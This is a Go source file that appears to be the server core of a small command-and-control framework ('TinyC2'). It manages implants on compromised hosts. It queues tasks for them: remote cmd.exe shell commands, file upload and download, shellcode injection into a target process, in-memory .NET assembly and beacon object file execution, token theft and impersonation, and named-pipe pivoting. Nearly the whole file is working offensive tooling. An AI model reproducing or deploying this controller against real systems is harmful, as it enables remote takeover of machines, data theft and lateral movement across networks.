// Package core
package core

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"time"

	"github.com/0xPrimo/TinyC2/server/internal/pkg/logger"
	"github.com/0xPrimo/TinyC2/server/internal/pkg/pack"
	"github.com/0xPrimo/TinyC2/server/internal/pkg/store"

	"github.com/pterm/pterm"
)

type Channel struct {
	Name     string
	ID       uint32
	Protocol string
	Fallback bool
	InUse    bool
}
type Implant struct {
	ID   uint32
	Seen time.Time

	Channels     *store.Store[string, *Channel]
	ChannelInUse *Channel

	Tasks []map[string]any
}

type TaskResult struct {
	Name     string `json:"name"`
	Output   string `json:"output"`
	Artifact string `json:"artifact"`
	Status   string `json:"status"`
}

type ImplantResponse struct {
	ID    uint32       `json:"id"`
	Tasks []TaskResult `json:"tasks"`
}

func (e *Engine) ImplantProcess(listener string, data []byte) ([]byte, error) {
	var response ImplantResponse

	err := json.Unmarshal(data, &response)
	if err != nil {
		logger.Error("error parsing JSON: %v", err)
		return nil, err
	}

	if !e.ImplantExists(response.ID) {
		return e.ImplantRegister(response.ID, listener)
	} else {
		// update implant last seen
		implant := e.Implants[response.ID]
		implant.Seen = time.Now()
		e.Implants[response.ID] = implant

		// task result processing
		e.ImplantTaskResultDispatch(response.ID, response.Tasks)

		// return task requests
		return e.ImplantGetTaskRequests(response.ID), nil
	}
}

func (e *Engine) ImplantRegister(id uint32, listenerName string) ([]byte, error) {
	if e.ImplantExists(id) {
		return []byte{}, fmt.Errorf("implant already exists")
	}

	listener, ok := e.ListenerGet(listenerName)
	if !ok {
		return []byte{}, fmt.Errorf("listener not found")
	}

	channels := store.NewStore[string, *Channel]()
	channel := &Channel{
		Name:     listener.Name,
		ID:       listener.ID,
		Protocol: listener.Protocol,
		Fallback: true,
		InUse:    true,
	}

	channels.Set(listenerName, channel)
	implant := Implant{
		ID:           id,
		ChannelInUse: channel,
		Channels:     channels,
	}

	e.Implants[id] = implant

	data, err := json.Marshal(map[string]any{"magic": "baadf00d"})
	if err != nil {
		logger.Error("error marshaling JSON: %v", err)
		return []byte{}, err
	}

	fmt.Println()
	logger.Success("implant %X registered", id)

	return data, nil
}

func (e *Engine) ImplantTaskExecute(id uint32, task map[string]any) {
	implant, exists := e.Implants[id]
	if !exists {
		logger.Error("implant %s does not exists", pterm.Cyan(id))
		return
	}

	implant.Tasks = append(implant.Tasks, task)
	e.Implants[id] = implant
}

func (e *Engine) ImplantGetTaskRequests(id uint32) []byte {
	implant, exists := e.Implants[id]
	if !exists {
		logger.Error("implant %X does not exists", pterm.Cyan(id))
		return []byte{}
	}

	tasks := implant.Tasks
	implant.Tasks = []map[string]any{}
	e.Implants[id] = implant

	data, err := json.Marshal(tasks)
	if err != nil {
		logger.Error("error marshaling JSON: %v", err)
		return []byte{}
	}

	if len(tasks) > 0 {
		fmt.Println()
		logger.Info("sent %d bytes to implant %X", len(data), id)
		return data
	}

	return nil
}

func (e *Engine) ImplantExists(id uint32) bool {
	_, exists := e.Implants[id]
	if !exists {
		return false
	}
	return true
}

func (e *Engine) ImplantIsAlive(id uint32) bool {
	implant, exists := e.Implants[id]
	if !exists {
		return false
	}

	return time.Since(implant.Seen) <= 5*time.Second
}

func (e *Engine) ImplantKill(id uint32) error {
	if !e.ImplantExists(id) {
		logger.Error("implant %X does not exists", id)
		return nil
	}

	// execute exit command
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "exit",
		"args":     nil,
		"artifact": nil,
	})
	return nil
}

func (e *Engine) ImplantList() error {
	table := pterm.TableData{
		{"ID", "Listener", "Status"},
	}

	for id, implant := range e.Implants {
		if e.ImplantIsAlive(id) {
			table = append(table, []string{pterm.Cyan(fmt.Sprintf("%X", id)), implant.ChannelInUse.Name, pterm.Green("alive")})
		} else {
			table = append(table, []string{pterm.Cyan(fmt.Sprintf("%X", id)), implant.ChannelInUse.Name, pterm.Red("dead")})
		}
	}

	pterm.Println()
	pterm.DefaultTable.
		WithHasHeader().
		WithBoxed().
		WithHeaderStyle(pterm.NewStyle(pterm.FgLightMagenta, pterm.Bold)).
		WithData(table).
		Render()
	pterm.Println()

	return nil
}

func (e *Engine) ImplantChannelList(id uint32) error {
	implant, exists := e.Implants[id]
	if !exists {
		logger.Error("implant %X does not exists", id)
		return nil
	}

	table := pterm.TableData{
		{"ID", "Name", "Protocol", "Fallback"},
	}

	implant.Channels.ForEach(func(key string, value *Channel) {
		if value.InUse {
			table = append(table, []string{pterm.Green(fmt.Sprintf("* %X", value.ID)), pterm.Green(value.Name), pterm.Green(value.Protocol), pterm.Green(value.Fallback)})
		} else {
			table = append(table, []string{pterm.Cyan(fmt.Sprintf("%X", value.ID)), value.Name, value.Protocol, pterm.LightBlue(value.Fallback)})
		}
	})

	pterm.Println()
	pterm.DefaultTable.
		WithHasHeader().
		WithBoxed().
		WithHeaderStyle(pterm.NewStyle(pterm.FgLightMagenta, pterm.Bold)).
		WithData(table).
		Render()
	pterm.Println()

	return nil
}

func (e *Engine) ImplantChannelRegister(id uint32, name string) error {
	implant, exists := e.Implants[id]
	if !exists {
		logger.Error("implant %X does not exists", pterm.Cyan(id))
		return nil
	}

	if implant.Channels.Has(name) {
		logger.Error("channel %s already registered", name)
		return nil
	}

	// generate pic
	listener, exists := e.ListenerGet(name)
	if !exists {
		logger.Error("listener %s does not exists", name)
		return nil
	}

	pic, err := e.ListenerExtension(listener.Name)
	if err != nil {
		logger.Error("%v", err)
		return nil
	}

	implant.Channels.Set(listener.Name, &Channel{
		Name:     listener.Name,
		ID:       listener.ID,
		Protocol: listener.Protocol,
		Fallback: false,
	})

	e.Implants[id] = implant

	// execute channel.register command
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "channel.register",
		"args":     nil,
		"artifact": base64.StdEncoding.EncodeToString(pic),
	})

	return nil
}

func (e *Engine) ImplantChannelSwitch(id uint32, name string) error {
	implant, exists := e.Implants[id]
	if !exists {
		logger.Error("implant %X does not exists", id)
		return nil
	}

	channel, ok := implant.Channels.Get(name)
	if !ok {
		logger.Error("channel %s does not exists", pterm.Cyan(name))
		return nil
	}

	if channel.InUse {
		logger.Error("channel %s in use", pterm.Cyan(name))
		return nil
	}

	channel.InUse = true
	implant.ChannelInUse.InUse = false
	implant.ChannelInUse = channel
	e.Implants[id] = implant

	// execute channel.swtich command
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "channel.switch",
		"args":     []uint32{channel.ID},
		"artifact": nil,
	})

	return nil
}

func (e *Engine) ImplantChannelRemove(id uint32, name string) error {
	implant, exists := e.Implants[id]
	if !exists {
		logger.Error("implant %X does not exists", id)
		return nil
	}

	channel, ok := implant.Channels.Get(name)
	if !ok {
		logger.Error("channel %s not registered", name)
		return nil
	}

	if channel.Fallback {
		logger.Error("channel %s is fallback", pterm.Cyan(name))
		return nil
	}

	if channel.InUse {
		logger.Error("channel %s already in-use", pterm.Cyan(name))
		return nil
	}

	implant.Channels.Delete(name)
	e.Implants[id] = implant

	e.ImplantTaskExecute(id, map[string]any{
		"name":     "channel.remove",
		"args":     []uint32{channel.ID},
		"artifact": nil,
	})

	return nil
}

func (e *Engine) ImplantJobStop(id uint32, jobid uint32) error {
	// execute job.stop command
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "job.stop",
		"args":     []uint32{jobid},
		"artifact": nil,
	})

	return nil
}

func (e *Engine) ImplantJobList(id uint32) error {
	// execute job.stop command
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "job.list",
		"args":     nil,
		"artifact": nil,
	})

	return nil
}

// ImplantPs
func (e *Engine) ImplantPs(id uint32) error {
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "ps",
		"args":     nil,
		"artifact": nil,
	})

	return nil
}

func (e *Engine) ImplantCd(id uint32, directory string) error {
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "cd",
		"args":     []string{directory},
		"artifact": nil,
	})

	return nil
}

func (e *Engine) ImplantCp(id uint32, src string, dest string) error {
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "cp",
		"args":     []string{src, dest},
		"artifact": nil,
	})

	return nil
}

func (e *Engine) ImplantShell(id uint32, command string) error {
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "shell",
		"args":     []string{"C:\\Windows\\System32\\cmd.exe /c " + command},
		"artifact": nil,
	})

	return nil
}

func (e *Engine) ImplantDownload(id uint32, path string) error {
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "download",
		"args":     []string{path},
		"artifact": nil,
	})

	return nil
}

func (e *Engine) ImplantUpload(id uint32, src string, dest string) error {
	data, err := os.ReadFile(src)
	if err != nil {
		logger.Error("failed to read file: %v", err)
		return err
	}

	e.ImplantTaskExecute(id, map[string]any{
		"name":     "upload",
		"args":     []string{dest},
		"artifact": base64.StdEncoding.EncodeToString(data),
	})

	return nil
}

func (e *Engine) ImplantRun(id uint32, commandline string) error {
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "run",
		"args":     []string{commandline},
		"artifact": nil,
	})

	return nil
}

func (e *Engine) ImplantExecuteAssembly(id uint32, dotnet string, cmdargs string) error {
	args := []string{
		"-Dcrystalpalace.verbose=false",
		"-jar",
		e.Config.CrystalPalace.Lib,
		"buildPic",
		filepath.Join(e.Config.CrystalPalace.Pavilion, "execute-assembly-pico/runner.spec"),
		"x64",
		"/tmp/runner.bin",
		`%ASSEMBLY_PATH=` + dotnet,
		`%CMDLINE=` + cmdargs,
	}

	cmd := exec.Command("java", args...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		logger.Error("configuration failed: %v", err)
		return nil
	}

	// read shellcode
	pic, err := os.ReadFile("/tmp/runner.bin")
	if err != nil {
		logger.Error("failed to read implant exe: %v", err)
		return nil
	}

	e.ImplantTaskExecute(id, map[string]any{
		"name":     "execute-assembly",
		"args":     nil,
		"artifact": base64.StdEncoding.EncodeToString(pic),
	})

	return nil
}

func (e *Engine) ImplantInlineExecute(id uint32, bof string, bofargs []byte) {
	// read bof
	bofraw, err := os.ReadFile(bof)
	if err != nil {
		logger.Error("failed to read beacon object file: %v", err)
		return
	}

	// execute task
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "inline-execute",
		"args":     []string{base64.StdEncoding.EncodeToString(bofargs)},
		"artifact": base64.StdEncoding.EncodeToString(bofraw),
	})
}

func (e *Engine) ImplantInlineExecuteEx(id uint32, bof string, packorder string, args []string) {
	// read bof
	bofraw, err := os.ReadFile(bof)
	if err != nil {
		logger.Error("failed to read beacon object file: %v", err)
		return
	}

	// pack arguments
	bofargs, err := pack.BofPack(packorder, args)
	if err != nil {
		logger.Error("failed to pack beacon object file arguments: %v", err)
		return
	}

	// execute task
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "inline-execute",
		"args":     []string{base64.StdEncoding.EncodeToString(bofargs)},
		"artifact": base64.StdEncoding.EncodeToString(bofraw),
	})
}

func (e *Engine) ImplantInjectShellcode(id uint32, pid int, path string) {
	payload, err := os.ReadFile(path)
	if err != nil {
		logger.Error("failed to read beacon object file: %v", err)
		return
	}

	// execute task
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "inject-shellcode",
		"args":     []int{pid},
		"artifact": base64.StdEncoding.EncodeToString(payload),
	})
}

func (e *Engine) ImplantTokenInfo(id uint32) {
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "token.info",
		"args":     nil,
		"artifact": nil,
	})
}

func (e *Engine) ImplantTokenRev2Self(id uint32) {
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "token.rev2self",
		"args":     nil,
		"artifact": nil,
	})
}

func (e *Engine) ImplantTokenMake(id uint32, domain string, username string, password string) {
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "token.make",
		"args":     []string{domain, username, password},
		"artifact": nil,
	})
}

func (e *Engine) ImplantTokenSteal(id uint32, pid uint32) {
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "token.steal",
		"args":     []uint32{pid},
		"artifact": nil,
	})
}

func (e *Engine) ImplantPivotConnect(id uint32, pipe string) {
	cfg, err := pack.BofPack("z", []string{pipe})
	if err != nil {
		logger.Error("failed to pack peer connection config: %v", err)
		return
	}

	e.ImplantTaskExecute(id, map[string]any{
		"name":     "pivot.connect",
		"args":     []uint32{1},
		"artifact": base64.StdEncoding.EncodeToString(cfg),
	})
}
